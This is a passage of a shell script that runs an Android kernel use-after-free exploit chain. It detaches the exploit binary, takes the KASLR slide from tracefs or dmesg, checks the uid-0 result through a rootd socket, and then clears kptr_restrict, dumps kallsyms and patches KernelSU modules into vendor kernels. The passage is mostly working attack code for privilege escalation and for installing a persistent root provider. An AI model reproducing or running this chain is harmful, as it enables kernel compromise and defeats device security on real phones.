        if [ -n "$_ds" ]; then
            SLIDE_ARG="--slide $_ds"
            echo "98260_SLIDE_SOURCE=dmesg value=$_ds reason=tracefs_unavailable"
        else
            echo "98260_SLIDE_BLOCKED tracefs=${_tf:-?} trigger=${_tr:-?} event=${_ev:-?} dmesg=no_offset"
            echo "FAIL=98260_slide_unavailable reason=tracefs_and_dmesg"
            echo "98260_CHAIN_END=FAIL code=81"
            echo "HINT=UAF 未启动，本 boot 名额没烧；等系统更安静时可直接再试，不用重启"
            exit 81
        fi
    else
        # g264/g84/g77f 等 blind 构建的真实设备上，kmem_cache_alloc 的
        # enable 文件可能不可写（event=0），但 rss_stat trigger=1 仍可
        # 通过 enable_event 打开分配 trace。不要因为 event=0 直接判死，
        # 先让完整 --check 尝试用 trigger 采样 slide；只有 slide 仍为空
        # 才 fail closed。
        if [ "${_ev:-0}" = "0" ]; then
            echo "98260_SLIDE_QUICK_EVENT_DENIED=1 try_full_check=1 trigger=${_tr:-?}"
        fi
        _try=0
        while [ "$_try" -lt 3 ] && [ -z "$SLIDE_ARG" ]; do
            _try=$((_try + 1))
            "$BIN" --check > "$D/98260-check.json" 2>/dev/null || true
            _sl=$(sed -n 's/.*"slide":"\(0x[0-9a-fA-F]*\)".*/\1/p' "$D/98260-check.json" 2>/dev/null | tail -1)
            case "$_sl" in
                ""|0x0000000000000000) ;;
                *) SLIDE_ARG="--slide $_sl"; echo "98260_SLIDE_SOURCE=check value=$_sl try=$_try" ;;
            esac
            [ -n "$SLIDE_ARG" ] && break
            echo "98260_SLIDE_CHECK_MISS try=$_try"
            [ "$_try" -lt 3 ] && sleep 20
        done
        if [ -z "$SLIDE_ARG" ]; then
            _ds=$(_dmesg_slide 2>/dev/null) || _ds=""
            if [ -n "$_ds" ]; then
                SLIDE_ARG="--slide $_ds"
                echo "98260_SLIDE_SOURCE=dmesg value=$_ds reason=measure_empty"
            else
                echo "98260_SLIDE_UNAVAILABLE reason=measure_empty_and_no_dmesg"
                echo "FAIL=98260_slide_unavailable"
                echo "98260_CHAIN_END=FAIL code=81"
                echo "HINT=UAF 未启动，本 boot 名额没烧；等系统更安静时可直接再试，不用重启"
                exit 81
            fi
        fi
    fi
fi

cd "$D" || exit 74
# Detach into a new session so an interrupted adb shell / app shell cannot
# deliver SIGHUP/SIGTERM to the exploit or its rootd child.  stdin must be
# closed as well: adb's pty would otherwise keep the process tied to the
# session that dies on disconnect.
if command -v setsid >/dev/null 2>&1; then
    SETSID="setsid"
elif [ -x /system/bin/toybox ]; then
    SETSID="/system/bin/toybox setsid"
else
    SETSID=""
fi
# g264 真机（GT-2 香芋，19:38）：trace 证实永远不亮（page_freed=0，12/12 miss），
# 1.0.29 起 g264 专版二进制带盲写回收路径，stream miss 后不等 trace 直接写，
# 成败交给 rootd 校验。g7d 仍走原路径（那边 trace 一直是好的）。
if [ "$K6157" = "1" ] && [ "$G7D" = "0" ]; then
    G264_BLIND=1
else
    G264_BLIND=0
fi
if [ -n "$SETSID" ]; then
    $SETSID env \
        PC98260_MAX_ATTEMPTS=$ATTEMPTS \
        PC98260_NO_FALLBACK=1 \
        PC98260_BUDGET_S=$BUDGET \
        PC98260_WAIT_CAP_S=$WAIT_CAP \
        PC98260_CHURN_ROUNDS=$CHURN_ROUNDS \
        PC98260_CHURN_PER_CPU=$CHURN_PER_CPU \
        PC98260_KSU_SIG=$SIG_WANT \
        PC98260_G264_BLIND_RECLAIM=$G264_BLIND \
        "$BIN" $REAL_CRED_ARG $SLIDE_ARG < /dev/null >> "$LOG" 2>&1 &
    DETACH_MODE=setsid
else
    nohup env \
        PC98260_MAX_ATTEMPTS=$ATTEMPTS \
        PC98260_NO_FALLBACK=1 \
        PC98260_BUDGET_S=$BUDGET \
        PC98260_WAIT_CAP_S=$WAIT_CAP \
        PC98260_CHURN_ROUNDS=$CHURN_ROUNDS \
        PC98260_CHURN_PER_CPU=$CHURN_PER_CPU \
        PC98260_KSU_SIG=$SIG_WANT \
        PC98260_G264_BLIND_RECLAIM=$G264_BLIND \
        "$BIN" $REAL_CRED_ARG $SLIDE_ARG < /dev/null >> "$LOG" 2>&1 &
    DETACH_MODE=nohup
fi
EXEC_PID=$!
UAF_STARTED=1
echo "98260_EXEC_PID=$EXEC_PID"
echo "98260_DETACH=$DETACH_MODE"
echo "98260_LOG=$LOG"

i=0
while [ "$i" -lt 240 ]; do
    if [ -S "$SOCK" ]; then break; fi
    # exploit 还活着时，每 30 秒把它的日志尾巴同步进主日志（tail 输出直写 /sdcard
    # 的镜像），这样 g264 这类"UAF 打不中、rootd 永远不来"的情况不用再靠猜。
    if [ $((i % 30)) -eq 29 ]; then
        if kill -0 "$EXEC_PID" 2>/dev/null; then
            echo "98260_UAF_STILL_RUNNING t=${i}s alive=1"
        else
            echo "98260_UAF_STILL_RUNNING t=${i}s alive=0"
        fi
        tail -n 15 "$LOG" 2>/dev/null || true
    fi
    if ! kill -0 "$EXEC_PID" 2>/dev/null; then
        parked_mark
        echo "FAIL=proof exec_exited pid=$EXEC_PID"
        tail -80 "$LOG" 2>/dev/null || true
        restore_enforcing_after_fail
        echo "98260_CHAIN_END=FAIL code=80"
        exit 80
    fi
    sleep 1
    i=$((i + 1))
done

if [ ! -S "$SOCK" ]; then
    parked_mark
    echo "FAIL=proof no_rootd_socket_after_240s pid=$EXEC_PID"
    echo "HINT=do NOT kill; reboot the phone and retry"
    tail -80 "$LOG" 2>/dev/null || true
    restore_enforcing_after_fail
    echo "98260_CHAIN_END=FAIL code=80"
    exit 80
fi

verify_su
cat "$VERIFY"
if ! awk '$1 == 0 { found = 1 } END { exit found ? 0 : 1 }' "$VERIFY"; then
    parked_mark
    echo "FAIL=proof uid_not_zero"
    echo "HINT=rootd socket 已经在了，但校验没过；看上面的 VERIFY 输出"
    restore_enforcing_after_fail
    echo "98260_CHAIN_END=FAIL code=80"
    exit 80
fi
# real_cred 没装上（uid 已经是 0、euid/egid 也是 0，/proc 的 Ruid 仍是 shell）
# 不影响后面的交接：ksu_prepare / ksu-loader 都吃 geteuid()，不是 getuid()。
# 1.0.7 在这里 FAIL 会浪费一次成功的提权，所以降级为告警并继续。
if ! grep -q '^Uid:[[:space:]]*0[[:space:]]*0[[:space:]]*0[[:space:]]*0' "$VERIFY"; then
    echo "98260_WARN=real_cred_pending proceed=1 uid_column=$(grep '^Uid:' "$VERIFY" | head -1)"
fi
if ! grep -q '^Gid:[[:space:]]*0[[:space:]]*0[[:space:]]*0[[:space:]]*0' "$VERIFY"; then
    parked_mark
    echo "FAIL=proof gid_not_zero"
    restore_enforcing_after_fail
    echo "98260_CHAIN_END=FAIL code=80"
    exit 80
fi
UAF_STARTED=0

start_reboot_watch

# ---------------------------------------------------------------------------
# Resolve flavor/profile/syms/slide once.  Both the custom KO patch and the
# KernelSU handoff must use the currently selected Flavor's symbols.
# ---------------------------------------------------------------------------
KSU_ENABLE=${MAGICROOT_98260_KSU:-1}
case "$KERNEL" in
    *6.18.21*ge186062ea75f*)
        if [ "$KSU_ENABLE" = "1" ]; then
            echo "98260_KSU_FORCE=0 reason=no_matching_6.18_brm_lkm"
            KSU_ENABLE=0
        fi ;;
esac
KSU_LOG=$D/98260-ksu.log
ADB_ROOT_98260=${MAGICROOT_ADB_ROOT:-0}
case "$ADB_ROOT_98260" in 1) ;; *) ADB_ROOT_98260=0 ;; esac
KERNEL_UMOUNT_98260=${MAGICROOT_KERNEL_UMOUNT:-1}
case "$KERNEL_UMOUNT_98260" in 1) ;; *) KERNEL_UMOUNT_98260=0 ;; esac
SELINUX_HIDE_98260=${MAGICROOT_SELINUX_HIDE:-1}
case "$SELINUX_HIDE_98260" in 1) ;; *) SELINUX_HIDE_98260=0 ;; esac
ALLOW_SHELL_98260=${MAGICROOT_ALLOW_SHELL:-1}
case "$ALLOW_SHELL_98260" in 1) ;; *) ALLOW_SHELL_98260=0 ;; esac
SU_COMPAT_98260=${MAGICROOT_SU_COMPAT:-1}
case "$SU_COMPAT_98260" in 1) ;; *) SU_COMPAT_98260=0 ;; esac
SU_ENTRY_98260=${MAGICROOT_SU_ENTRY:-1}
case "$SU_ENTRY_98260" in 1) ;; *) SU_ENTRY_98260=0 ;; esac
# su_entry without su_compat has no persistent provider: the old
# /product/bin wrapper called pc98260-su, but rootd is cleaned below, so every
# later app call died with KSU_RC=127.  Keep a real KSU su provider whenever
# su_entry is requested; the product-bin bind mount is no longer created.
if [ "$SU_ENTRY_98260" = "1" ] && [ "$SU_COMPAT_98260" = "0" ]; then
    echo "98260_SU_COMPAT_OVERRIDE=1 reason=su_entry_needs_persistent_provider"
    SU_COMPAT_98260=1
fi
echo "98260_OPTIONS=allow_shell=$ALLOW_SHELL_98260 su_compat=$SU_COMPAT_98260 su_entry=$SU_ENTRY_98260"
KSU_FLAVOR_LOCAL=$(printf '%s' "${MAGICROOT_KSU_FLAVOR:-}" | tr -d '\r\n')
[ -n "$KSU_FLAVOR_LOCAL" ] || KSU_FLAVOR_LOCAL=$(cat "$D/ksu_flavor" 2>/dev/null | tr -d '\r\n')
[ -n "$KSU_FLAVOR_LOCAL" ] || KSU_FLAVOR_LOCAL=kernelsu
case "$KERNEL" in
    *6.6.118*g554929766a0d*) PROFILE_LOCAL=g554 ;;
    *6.6.118*gf17133276a57*) PROFILE_LOCAL=f171 ;;
    *6.18.21*g928d1bb4f1d7*) PROFILE_LOCAL=61821 ;;
    *6.18.21*ge186062ea75f*) PROFILE_LOCAL=61821brm ;;
    6.1.*-android14-11-*) PROFILE_LOCAL=6157 ;;
    6.12.38-android16-5-gfde7767f6ef6-abogki481467632-4k) PROFILE_LOCAL=6138 ;;
    6.12.23-android16-5-g45ea5e4bce8a-abogki445100407-4k) PROFILE_LOCAL=6123 ;;
    6.12.38-android16-5-g7ae8ec909e03-abogki471017112-4k) PROFILE_LOCAL=6138y ;;
    *) PROFILE_LOCAL=61258 ;;
esac
CHECK_JSON=$D/98260-check.json
"$BIN" --check > "$CHECK_JSON" 2>/dev/null || true
SLIDE=$(sed -n 's/.*"slide":"\(0x[0-9a-fA-F]*\)".*/\1/p' "$CHECK_JSON" 2>/dev/null | tail -1)
if [ -z "$SLIDE" ]; then
    SLIDE=$(sed -n 's/.*\[slide\] measured \(0x[0-9a-fA-F]*\).*/\1/p' "$LOG" 2>/dev/null | tail -1)
fi
if [ -f "$D/kernel_profiles.sh" ]; then
    . "$D/kernel_profiles.sh" 2>/dev/null || true
fi
KSU_FLAVOR_LOCAL=$(ksu_flavor_normalize "$KSU_FLAVOR_LOCAL" 2>/dev/null || echo kernelsu)
if [ "$PROFILE_LOCAL" = "61821" ] && [ "$KSU_FLAVOR_LOCAL" != "kernelsu" ]; then
    echo "98260_KSU_FLAVOR_FORCE=kernelsu reason=6.18_exact_official_assets requested=$KSU_FLAVOR_LOCAL"
    KSU_FLAVOR_LOCAL=kernelsu
fi
ksu_select_ko "$PROFILE_LOCAL" "$KSU_FLAVOR_LOCAL" 2>/dev/null || true
# Manager-adaptive userspace: the app extracts the selected manager's ksud
# (kernelsu / resukisu / fina / sukisu / next) into the work dir.  Prefer it
# for the 6.1.x handoff; the bundled g264 ksud is only a fallback.
KSUD_MANAGER=""
KSUD_MANAGER_SOURCE=""
for _kc in "${MAGICROOT_KSUD:-}" \
           "$D/ksud_${KSU_FLAVOR_LOCAL}.manager" \
           "$D/ksud_${KSU_FLAVOR_LOCAL}"; do
    [ -n "$_kc" ] && [ -x "$_kc" ] || continue
    _kv=$(timeout 5 "$_kc" -V 2>/dev/null | head -1)
    case "$_kv" in
        *ksud*)
            KSUD_MANAGER="$_kc"
            case "$_kc" in
                "$D"/ksud_*.manager) KSUD_MANAGER_SOURCE=manager-apk ;;
                *) KSUD_MANAGER_SOURCE=workdir ;;
            esac
            echo "98260_KSUD_MANAGER=path=$_kc source=$KSUD_MANAGER_SOURCE version=$_kv flavor=$KSU_FLAVOR_LOCAL"
            break ;;
    esac
done
if [ -z "$KSUD_MANAGER" ]; then
    echo "98260_KSUD_MANAGER=none flavor=$KSU_FLAVOR_LOCAL fallback=bundled"
fi
# The app extracts the selected manager's embedded LKM into
# ko-<flavor>.ko (same extraction used by 6.12/6.6).  For 6.1.x it is only
# loadable through ksu_prepare/ksu-loader when its vermagic is an exact match
# for this vendor build; otherwise the per-build CGA module remains the
# fail-closed path (the manager's GKI module is not vermagic-compatible with
# Honor's 6.1.157/6.1.99/6.1.128 vendor kernels).
MANAGER_KO="${MAGICROOT_MANAGER_KO:-$D/ko-${KSU_FLAVOR_LOCAL}.ko}"
MANAGER_KO_OK=0
MANAGER_KO_VERMAGIC=""
if [ -f "$MANAGER_KO" ]; then
    _mvm=$(grep -a -o 'vermagic=[^ ]*' "$MANAGER_KO" 2>/dev/null | head -1)
    MANAGER_KO_VERMAGIC=${_mvm#vermagic=}
    [ "$_mvm" = "vermagic=$KERNEL" ] && MANAGER_KO_OK=1
    echo "98260_MANAGER_LKM=path=$MANAGER_KO vermagic=${MANAGER_KO_VERMAGIC:-unknown} compatible=$MANAGER_KO_OK target=$KERNEL flavor=$KSU_FLAVOR_LOCAL"
else
    echo "98260_MANAGER_LKM=none flavor=$KSU_FLAVOR_LOCAL fallback=cga"
fi

# ---------------------------------------------------------------------------
# Experimental (2026-11-13): try the selected manager's own LKM before the
# per-build CGA/M6 fallback.  The app already carved ko-<flavor>.ko from the
# manager APK; patch it with this build's CGA-resolved symbol table and the
# boot slide, then insmod.  Any failure returns non-zero so the proven CGA/M6
# branch still runs.  Disable with MAGICROOT_6157_MANAGER_KO_LOAD=0.
# ---------------------------------------------------------------------------
try_manager_ko_6157() {
    if [ "${MAGICROOT_6157_MANAGER_KO_LOAD:-1}" != "1" ]; then
        echo "98260_KSU_MANAGER_KO=skip reason=disabled"
        return 1
    fi
    if [ -z "${SLIDE:-}" ]; then
        echo "98260_KSU_MANAGER_KO=skip reason=no_slide"
        return 1
    fi
    if [ -z "$MANAGER_KO" ] || [ ! -f "$MANAGER_KO" ]; then
        echo "98260_KSU_MANAGER_KO=skip reason=no_manager_ko flavor=$KSU_FLAVOR_LOCAL"
        return 1
    fi
    if [ ! -x "$D/ko_patch" ]; then
        echo "98260_KSU_MANAGER_KO=skip reason=no_ko_patch"
        return 1
    fi
    _mgr_build=$P6157
    [ "$G7D" = "1" ] && _mgr_build=g7d
    _mgr_syms=$D/g264/syms-$_mgr_build.txt
    if [ ! -f "$_mgr_syms" ]; then
        echo "98260_KSU_MANAGER_KO=skip reason=no_syms build=$_mgr_build flavor=$KSU_FLAVOR_LOCAL"
        return 1
    fi
    case "$MANAGER_KO_VERMAGIC" in
        6.1.157*) ;;
        6.1.*)
            # A GKI manager LKM built for another 6.1.y still gets a chance in
            # this test path, but log the patch-level mismatch explicitly.
            echo "98260_KSU_MANAGER_KO=warn vermagic_patchlevel=${MANAGER_KO_VERMAGIC} target=$KERNEL" ;;
        *)
            echo "98260_KSU_MANAGER_KO=skip reason=vermagic flavor=$KSU_FLAVOR_LOCAL vermagic=${MANAGER_KO_VERMAGIC:-unknown}"
            return 1 ;;
    esac
    # Prefer a runtime kallsyms table.  The CGA base can be stale for this
    # vendor build (gaaa run 20261113T081541: _printk link+slide was 0xE00
    # off), and manager LKMs are often built for a different 6.1.y patch
    # level.  Runtime addresses need no slide; ko_patch's 7th-arg fallback is
    # only for names missing from the table.
    _mgr_syms_use=""
    _mgr_slide_use=0
    if "$SU" -c 'echo 0 > /proc/sys/kernel/kptr_restrict 2>/dev/null; cat /proc/kallsyms' \
            > "$D/kallsyms-manager.txt" 2>/dev/null; then
        _kall_ok=$(awk '$1 != "0000000000000000" {n++} END{print n+0}' \
            "$D/kallsyms-manager.txt" 2>/dev/null)
        if [ "${_kall_ok:-0}" -gt 1000 ] 2>/dev/null; then
            awk 'NF >= 3 && $1 != "0000000000000000" && !seen[$3]++ {print $3, "0x"$1}' \
                "$D/kallsyms-manager.txt" > "$D/syms-manager-runtime.txt" 2>/dev/null
            if [ -s "$D/syms-manager-runtime.txt" ]; then
                _mgr_syms_use=$D/syms-manager-runtime.txt
                echo "98260_KSU_MANAGER_KO_SYMS=runtime kallsyms=$(wc -l < "$D/syms-manager-runtime.txt" 2>/dev/null) slide=0"
            fi
        else
            echo "98260_KSU_MANAGER_KO_SYMS=unavailable reason=kallsyms_masked"
        fi
    else
        echo "98260_KSU_MANAGER_KO_SYMS=unavailable reason=kallsyms_unreadable"
    fi
    if [ -z "$_mgr_syms_use" ]; then
        if [ "${MAGICROOT_6157_MANAGER_KO_ALLOW_CGA_SYMS:-0}" = "1" ]; then
            # Experimental escape hatch: the CGA table can be stale for a
            # vendor build (gaaa 20261113T081541: _printk 0xE00 off), so this
            # must never be the default.
            _mgr_syms_use=$_mgr_syms
            _mgr_slide_use=$SLIDE
            echo "98260_KSU_MANAGER_KO_SYMS=fallback_cga warn=stale_base_risk"
        else
            echo "98260_KSU_MANAGER_KO=skip reason=kallsyms_unavailable hint=MAGICROOT_6157_MANAGER_KO_ALLOW_CGA_SYMS=1"
            return 1
        fi
    fi
    _mgr_out=$D/ksm-manager-$_mgr_build-$KSU_FLAVOR_LOCAL.ko
    _mgr_log=$D/98260-manager-ko-patch.log
    : > "$_mgr_log" 2>/dev/null || true
    echo "98260_KSU_MANAGER_KO=begin flavor=$KSU_FLAVOR_LOCAL build=$_mgr_build syms=$_mgr_syms_use slide=$_mgr_slide_use template=$MANAGER_KO"
    "$D/ko_patch" "$MANAGER_KO" "$_mgr_out" "$_mgr_syms_use" "$_mgr_slide_use" "$KERNEL" >> "$_mgr_log" 2>&1
    _mgr_rc=$?
    _mgr_missing=$(sed -n 's/.*MISSING=\([0-9]*\).*/\1/p' "$_mgr_log" | tail -1)
    case "$_mgr_missing" in ''|*[!0-9]*) _mgr_missing=1 ;; esac
    cat "$_mgr_log" 2>/dev/null
    echo "98260_KSU_MANAGER_KO_PATCH rc=$_mgr_rc missing=$_mgr_missing out=$_mgr_out"
    # The runtime kallsyms table cannot see symbols the vendor hides from
    # /proc/kallsyms (g8d6 run 20261113: commit_creds).  The per-build CGA
    # table has them at link time, so run a second patch pass over the
    # already-patched module with that table and the boot slide.  Symbols the
    # first pass resolved are SHN_ABS and are skipped by ko_patch, so only the
    # hidden ones are filled and the runtime-correct addresses stay intact.
    if [ "$_mgr_missing" != "0" ] && [ "$_mgr_slide_use" = "0" ] && [ -f "$_mgr_syms" ]; then
        _mgr_fill=$D/ksm-manager-$_mgr_build-$KSU_FLAVOR_LOCAL-fill.ko
        "$D/ko_patch" "$_mgr_out" "$_mgr_fill" "$_mgr_syms" "$SLIDE" "$KERNEL" >> "$_mgr_log" 2>&1
        _fill_rc=$?
        _fill_missing=$(sed -n 's/.*MISSING=\([0-9]*\).*/\1/p' "$_mgr_log" | tail -1)
        case "$_fill_missing" in ''|*[!0-9]*) _fill_missing=1 ;; esac
        echo "98260_KSU_MANAGER_KO_CGA_FILL rc=$_fill_rc missing=$_fill_missing table=$_mgr_syms slide=$SLIDE"
        if [ "$_fill_rc" = "0" ] && [ "$_fill_missing" = "0" ] && [ -s "$_mgr_fill" ]; then
            mv -f "$_mgr_fill" "$_mgr_out"
            _mgr_missing=0
        fi
    fi
    # A newer manager LKM may also add BTF/nofault imports absent from the
    # per-build table.  Retry once with a root kallsyms dump (ko_patch's
    # optional 7th argument).
    if [ "$_mgr_missing" != "0" ]; then
        "$SU" -c 'echo 0 > /proc/sys/kernel/kptr_restrict 2>/dev/null; cat /proc/kallsyms' \
            > "$D/kallsyms-manager.txt" 2>/dev/null
        if [ -s "$D/kallsyms-manager.txt" ]; then
            echo "98260_KSU_MANAGER_KO_KALLSYMS=retry lines=$(wc -l < "$D/kallsyms-manager.txt" 2>/dev/null)"
            "$D/ko_patch" "$MANAGER_KO" "$_mgr_out" "$_mgr_syms_use" "$_mgr_slide_use" "$KERNEL" \
                "$D/kallsyms-manager.txt" >> "$_mgr_log" 2>&1
            _mgr_rc=$?
            _mgr_missing=$(sed -n 's/.*MISSING=\([0-9]*\).*/\1/p' "$_mgr_log" | tail -1)
            case "$_mgr_missing" in ''|*[!0-9]*) _mgr_missing=1 ;; esac
            cat "$_mgr_log" 2>/dev/null
            echo "98260_KSU_MANAGER_KO_PATCH rc=$_mgr_rc missing=$_mgr_missing out=$_mgr_out retry=kallsyms"
        fi
    fi
    if [ "$_mgr_rc" != "0" ] || [ "$_mgr_missing" != "0" ] || [ ! -s "$_mgr_out" ]; then
        echo "98260_KSU_MANAGER_KO=patch_failed rc=$_mgr_rc missing=$_mgr_missing; fallback=cga_or_m6"
        return 1
    fi
    # Only pass parameters the manager LKM actually declares; an unknown
    # parameter makes insmod fail instead of loading the module.
    _mgr_args=""
    if grep -aq 'parmtype=allow_shell' "$_mgr_out" 2>/dev/null; then
        _mgr_args="allow_shell=1"
    fi
    if [ "$SU_COMPAT_98260" = "0" ] && \
       grep -aq 'parmtype=force_feature' "$_mgr_out" 2>/dev/null; then
        _mgr_args="${_mgr_args:+$_mgr_args }force_feature=su_compat:0"
    fi
    timeout "${MAGICROOT_6157_INSMOD_TIMEOUT:-60}" \
        "$SU" -c "insmod $_mgr_out $_mgr_args" >> "$KSU_LOG" 2>&1
    _mgr_ins=$?
    echo "98260_KSU_MANAGER_KO_INSMOD rc=$_mgr_ins"
    sleep 2
    _mgr_live=0
    [ -d /sys/module/kernelsu ] && _mgr_live=1
    _mgr_probe=""
    if [ -x "${KSUD_MANAGER:-}" ]; then
        _mgr_probe=$(echo id | timeout 10 "$KSUD_MANAGER" debug su 2>/dev/null | tr -d '\r')
    fi
    case "$_mgr_probe" in *uid=0*) _mgr_live=1 ;; esac
    if [ "$_mgr_ins" != "0" ] || [ "$_mgr_live" != "1" ]; then
        echo "98260_KSU_MANAGER_KO=failed insmod_rc=$_mgr_ins live=$_mgr_live; fallback=cga_or_m6"
        return 1
    fi
    KSU_OK=1
    KSU6157_OK=1
    KSU_METHOD=manager-ko-patched
    KSUD=${KSUD_MANAGER:-$D/ksu6157-g264/ksud}
    echo "98260_KSU=loaded method=$KSU_METHOD flavor=$KSU_FLAVOR_LOCAL insmod_rc=$_mgr_ins ksud=$KSUD probe=$([ -n "$_mgr_probe" ] && echo ok || echo none)"
    _mgr_pkg=${MAGICROOT_KSU_PKG:-}
    if [ -z "$_mgr_pkg" ]; then
        case "$KSU_FLAVOR_LOCAL" in
            kernelsu) _mgr_pkg=me.weishu.kernelsu ;;
            next) _mgr_pkg=com.rifsxd.ksunext ;;
            sukisu) _mgr_pkg=com.sukisu.ultra ;;
            fina) _mgr_pkg=me.yuki.fina ;;
            nova) _mgr_pkg=com.sukisu.nova ;;
            maplesu) _mgr_pkg=dev.maplesu.manager ;;
            *) _mgr_pkg=com.resukisu.resukisu ;;
        esac
    fi
    if [ -n "$_mgr_pkg" ] && pm list packages 2>/dev/null | /system/bin/grep -qx "package:$_mgr_pkg"; then
        am force-stop "$_mgr_pkg" >/dev/null 2>&1
        monkey -p "$_mgr_pkg" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1
        echo "98260_KSU_MANAGER_OPENED=$_mgr_pkg"
    fi
    return 0
}

# 6.1.157 的 CGA 主路径不再走 ko_patch：它用 ksu6157/ 里的荣耀专用 LKM +
# ksu_prepare（按本 boot 的 KASLR slide 做绝对地址重定位）+ ksu-loader
# （同一进程 init_module 并继续 exec ksud）。上面的 manager-KO 测试路径是
# 例外：它用本 build 的 CGA 符号表 + ko_patch 重写管理器 LKM，失败即回退
# CGA/M6；CGA 主路径本身仍按原方式加载，不能被 ko_patch 改写。
if [ "$PROFILE_LOCAL" = "6157" ]; then
    KO_TEMPLATE=$KSU6157_DIR/kernelsu-honor.ko
fi
MGR=$(ksu_flavor_pkg "$KSU_FLAVOR_LOCAL" 2>/dev/null || echo me.weishu.kernelsu)
echo "98260_SYMBOLS=flavor=$KSU_FLAVOR_LOCAL profile=$PROFILE_LOCAL slide=$SLIDE"
[ -n "$SLIDE" ] || echo "98260_SLIDE_MISSING=1"

# ---------------------------------------------------------------------------
# Optional user-supplied kernel module.  SAF has already copied it to a
# device-readable path.  Check ELF / vermagic compatibility, then run the
# selected Flavor's ko_patch before loading the patched output.
# ---------------------------------------------------------------------------
if [ -n "$CUSTOM_KO" ] && [ "$K6157" = "1" ]; then
    # This block's ko_patch + "vermagic=6.12" gate targets the 6.12/6.6 GKI
    # manager-module remap.  6.1.x never reaches ko_patch here: every build
    # loads through its own CGA base.ko (ko_slide_patch, absolute symbols) or
    # the g7d M6 handoff, neither of which takes a user-supplied module.  It
    # used to fall into the generic branch below and always fail with the
    # confusing "vermagic_mismatch expected=6.12", as if the feature had
    # almost worked.
    echo "98260_CUSTOM_KO=unsupported reason=6157_cga_chain_has_no_custom_ko_path kernel=$KERNEL"
elif [ -n "$CUSTOM_KO" ]; then
    CUSTOM_LOG=$D/98260-custom-ko.log
    CUSTOM_PATCHED=$D/98260/custom-patched.ko
    : > "$CUSTOM_LOG" 2>/dev/null || true
    if [ -f "$CUSTOM_KO" ]; then
        MAGIC=$(od -An -tx1 -N4 "$CUSTOM_KO" 2>/dev/null | tr -d ' \n')
        EM=$(od -An -tx1 -j18 -N2 "$CUSTOM_KO" 2>/dev/null | tr -d ' \n')
        VM=$(grep -a -o 'vermagic=[^ ]*' "$CUSTOM_KO" 2>/dev/null | head -1)
        echo "98260_CUSTOM_KO_VERMAGIC=${VM:-unknown} elf=$MAGIC arch=$EM target=$KERNEL" | tee -a "$CUSTOM_LOG"
        if [ "$MAGIC" != "7f454c46" ]; then
            echo "98260_CUSTOM_KO=failed reason=not_elf path=$CUSTOM_KO"
        elif [ -n "$EM" ] && [ "$EM" != "b700" ]; then
            echo "98260_CUSTOM_KO=failed reason=not_aarch64 arch=$EM"
        elif [ -n "$VM" ] && ! printf '%s' "$VM" | grep -q '6\.12'; then
            echo "98260_CUSTOM_KO=failed reason=vermagic_mismatch expected=6.12 actual=$VM"
        elif [ -z "$SLIDE" ] || [ -z "$SYMS" ] || [ ! -f "$SYMS" ] || [ ! -x "$D/ko_patch" ]; then
            echo "98260_CUSTOM_KO=failed reason=patch_inputs_missing slide=$SLIDE syms=$SYMS"
        else
            "$D/ko_patch" "$CUSTOM_KO" "$CUSTOM_PATCHED" "$SYMS" "$SLIDE" "$KERNEL" \
                >> "$CUSTOM_LOG" 2>&1
            PATCH_RC=$?
            PATCH_LINE=$(grep -m1 '^PATCHED=' "$CUSTOM_LOG" 2>/dev/null)
            CUSTOM_MISSING=$(printf '%s\n' "$PATCH_LINE" | sed -n 's/^PATCHED=[0-9]* MISSING=\([0-9][0-9]*\).*/\1/p')
            echo "98260_CUSTOM_KO_PATCH=rc=$PATCH_RC missing=${CUSTOM_MISSING:-none} line=$PATCH_LINE" | tee -a "$CUSTOM_LOG"
            if [ "$PATCH_RC" != "0" ] || [ "${CUSTOM_MISSING:-1}" != "0" ] || [ ! -f "$CUSTOM_PATCHED" ]; then
                echo "98260_CUSTOM_KO=failed reason=ko_patch log=$CUSTOM_LOG"
            elif ! printf '%s\n' "$PATCH_LINE" | grep -Fq "VERMAGIC=$KERNEL SMP"; then
                echo "98260_CUSTOM_KO=failed reason=vermagic_target_mismatch expected=$KERNEL line=$PATCH_LINE"
            else
                echo "98260_CUSTOM_KO_VERMAGIC_MATCH=ok target=$KERNEL" | tee -a "$CUSTOM_LOG"
                printf 'insmod "%s" >/dev/null 2>&1; echo CUSTOM_KO_RC=$?\n' "$CUSTOM_PATCHED" \
                    | "$SU" > "$CUSTOM_LOG" 2>&1
                if grep -q 'CUSTOM_KO_RC=0' "$CUSTOM_LOG" 2>/dev/null; then
                    echo "98260_CUSTOM_KO=loaded path=$CUSTOM_PATCHED source=$CUSTOM_KO"
                else
                    echo "98260_CUSTOM_KO=failed reason=insmod log=$CUSTOM_LOG"
                fi
            fi
        fi
    else
        echo "98260_CUSTOM_KO=missing path=$CUSTOM_KO"
    fi
fi

# ---------------------------------------------------------------------------
# KernelSU handoff (DEFAULT ON; opt-out MAGICROOT_98260_KSU=0).
# ksud late-load first, insmod fallback; ksud comes from the selected Flavor.
# ---------------------------------------------------------------------------
if [ "$KSU_ENABLE" = "1" ]; then
    if ksu_live; then
        echo "98260_KSU=loaded already"
        KSU6157_OK=1
        # 上一轮若在载入后没还原（例如进程被杀），这里补一次。
        sig_restore_6157
    elif [ "$PROFILE_LOCAL" = "6157" ] && try_manager_ko_6157; then
        # LKM came from the selected manager; KSU_OK/KSUD are already set.
        :
    elif [ "$PROFILE_LOCAL" = "6157" ] && [ "$G7D" = "1" ] && \
         [ -x "$D/ksu6157-m6/ksu_loader.sh" ] && \
         [ -x "$D/ksu6157-m6/load_ko" ] && [ -x "$D/ksu6157-m6/ko_patch2" ] && \
         [ -f "$D/ksu6157-m6/kernelsu-os9-selx11.ko" ] && \
         [ -f "$D/ksu6157-m6/next_sym_addr.txt" ]; then
        # ------------------------------------------------------------------
        # g7d: keep the upstream-proven M6 2.78 handoff.  98260 only obtains the
        # bootstrap rootd.  The M6 loader injects ksu_rules, disables bootfail /
        # core_hang_detect, patches kernelsu-os9-selx11.ko with ko_patch2, loads
        # it with load_ko, and passes manager package/UID module parameters.
        # ------------------------------------------------------------------
        K6=$D/ksu6157-m6
        : > "$KSU_LOG" 2>/dev/null || true
        echo "98260_KSU_BACKEND=m6 dir=$K6 sig_before=${SIG_ORIG:-?} will_clear=$SIG_WANT" | tee -a "$KSU_LOG"
        if [ -L /data/local/tmp/ksu ] || [ ! -e /data/local/tmp/ksu ]; then
            ln -sfn "$K6" /data/local/tmp/ksu 2>/dev/null
        else
            _kb=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null | cut -c1-8)
